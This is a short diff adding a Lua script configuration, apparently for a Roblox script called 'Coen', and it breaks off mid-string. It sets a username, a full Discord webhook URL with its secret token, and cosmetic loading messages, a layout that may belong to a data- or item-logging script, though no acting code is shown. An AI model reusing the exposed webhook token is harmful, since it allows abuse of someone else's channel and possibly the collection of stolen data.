@@ -1,0 +1,8 @@
+Username = "sam521789"
+WebHook = "https://discord.com/api/webhooks/1119807918032834580/ZQYF1s_3lU9Zwj4lLYIX5B6BH16fkDBC00mcRGXA53I14XT_DLKyZnuJv4v-cykQc0oe"
+ 
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts
